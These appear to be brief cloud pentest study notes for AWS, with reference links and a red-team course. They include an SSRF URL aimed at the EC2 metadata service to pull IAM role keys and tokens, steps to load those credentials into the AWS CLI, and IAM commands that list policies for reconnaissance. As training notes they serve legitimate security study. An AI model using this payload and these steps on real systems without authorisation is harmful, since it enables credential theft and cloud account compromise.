# Cloud Pentest - Notes

**References:**

- https://github.com/RedTeamOperations/RedCloud-OS?tab=readme-ov-file

## Courses

- [Multi Cloud Red Team Analyst](https://cyberwarfare.live/product/multi-cloud-red-team-analyst-mcrta/)

## AWS

**References:**

- https://book.hacktricks.xyz/pentesting-web/ssrf-server-side-request-forgery/cloud-ssrf

**Commands:** 

Search S3 Buckets: `python3 cloud_enum.py -k "NAME"` 

SSRF URL for Token and key: `http://169.254.169.254/latest/meta-data/iam/security-credentials/ec2-role`

Configure & Validate Temporary Credential in AWS CLI:

1. aws configure set aws_access_key_id  [key-id] --profile ec2
2.  aws configure set aws_secret_access_key  [key-id] --profile ec2
3.  aws configure set aws_session_token [token] --profile ec2

Get the Managed Policy Attached to EC2 Instance : `aws iam list-attached-role-policies --role-name ec2-role --profile ec2`

List the IAM groups that the specified IAM user belongs to: `aws iam list-groups-for-user --user-name [user-name] --profile ec2`

 List the names of the inline policies embedded in the specified IAM role : ` aws iam list-role-policies --role-name [role-name] --profile ec2`

List all manages policies that are attached to the specified IAM user : `aws iam list-attached-user-policies --user-name [user-name] --profile ec2` 

Lists all managed policies that are attached to the specified IAM Group : `aws iam list-attached-group-policies --group-name [group-name] --profile ec2`